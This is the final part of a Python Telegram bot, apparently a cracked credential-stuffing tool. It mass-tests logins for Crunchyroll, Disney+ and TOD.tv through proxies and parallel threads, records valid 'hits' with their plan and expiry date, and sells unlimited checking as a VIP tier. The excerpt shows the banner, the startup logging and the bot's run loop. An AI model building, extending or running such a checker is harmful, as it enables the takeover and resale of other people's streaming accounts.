                    f.write(f"\nPLAN: {safe_str(result.get('plan', 'N/A'))}")
                    f.write(f"\nBILLING CYCLE: {safe_str(result.get('billing_cycle', 'N/A'))}")
                    f.write(f"\nEXPIRY DATE: {safe_str(result.get('expiry_date', 'N/A'))}")
                
                f.write(f"\n{'='*70}")
        except Exception as e:
            print(f"Error saving hit: {e}")
    
    def run(self):
        print("=" * 60)
        print("🤖 Streaming Account Checker Bot Started!")
        print("=" * 60)
        print(f"Bot Token: {BOT_TOKEN[:15]}...")
        print(f"Admins: {self.admin_ids}")
        print(f"Free Daily Limit: {FREE_DAILY_LIMIT}")
        print(f"VIP Price: ${VIP_PRICE} / {VIP_DURATION_DAYS} days")
        print("=" * 60)
        print("⚡ MULTI-THREADING CONFIGURATION:")
        print(f"   • Mass Check Threads: {MASS_CHECK_THREADS}")
        print(f"   • Proxy Test Threads: {PROXY_TEST_THREADS}")
        print(f"   • Expected Speedup: {MASS_CHECK_THREADS}x faster!")
        print("=" * 60)
        print("SERVICES LOADED:")
        print("   • Crunchyroll ✅ (Email login)")
        print("   • Disney+ ✅ (Email login)")
        print("   • TOD.tv ✅ (Phone or Email login)")
        print("=" * 60)
        print("User Management: ENABLED ✅")
        print("Button-Based Interface: ENABLED ✅")
        print("Fast Multi-Threading: ENABLED ✅")
        print("Phone Number Support: ENABLED ✅")
        print("=" * 60)
        print()
        
        self.bot.infinity_polling(timeout=10)


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("""
    ██████╗ ██████╗ ██╗   ██╗███╗   ██╗██╗   ██╗██╗  ██╗██╗   ██╗
   ██╔════╝██╔═══██╗██║   ██║████╗  ██║██║   ██║╚██╗██╔╝╚██╗ ██╔╝
   ██║     ██║   ██║██║   ██║██╔██╗ ██║██║   ██║ ╚███╔╝  ╚████╔╝ 
   ██║     ██║   ██║██║   ██║██║╚██╗██║██║   ██║ ██╔██╗   ╚██╔╝  
   ╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝██╔╝ ██╗   ██║   
    ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
    
╔══════════════════════════════════════════════════════════════════════╗
║              Streaming Account Checker Bot v3.0 - FAST!              ║
║         Crunchyroll & Disney+ & TOD.tv Account Checker               ║
║                    Cracked By: baron_saplar                          ║
║                                                                      ║
║  Features:                                                           ║
║  • 3 Services: Crunchyroll, Disney+, TOD.tv                         ║
║  • User Management System (Free/VIP)                                ║
║  • Button-Based Interface                                            ║
║  • ⚡ FAST Multi-Threading ({MASS_CHECK_THREADS}x parallel)           ║
║  • Daily Limits: Free = {FREE_DAILY_LIMIT} checks, VIP = Unlimited   ║
║  • Proxy Management with Database                                    ║
║  • Cancel Command for long checks                                    ║
║  • Phone Number Support for TOD.tv                                  ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    print(f"\n[+] Using Bot Token: {BOT_TOKEN[:15]}...")
    print(f"[+] Admin IDs: {ADMIN_IDS}")
    print(f"[+] Free Daily Limit: {FREE_DAILY_LIMIT}")
    print(f"[+] Multi-Threading: {MASS_CHECK_THREADS} parallel threads")
    print(f"[+] Services: Crunchyroll, Disney+, TOD.tv")
    print(f"[+] TOD.tv accepts both email and phone numbers!")
    print("\n[+] Starting bot...\n")
    
    bot = StreamingBot(BOT_TOKEN, ADMIN_IDS)
    
    try:
        bot.run()
    except KeyboardInterrupt:
        print("\n\n[!] Bot stopped")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
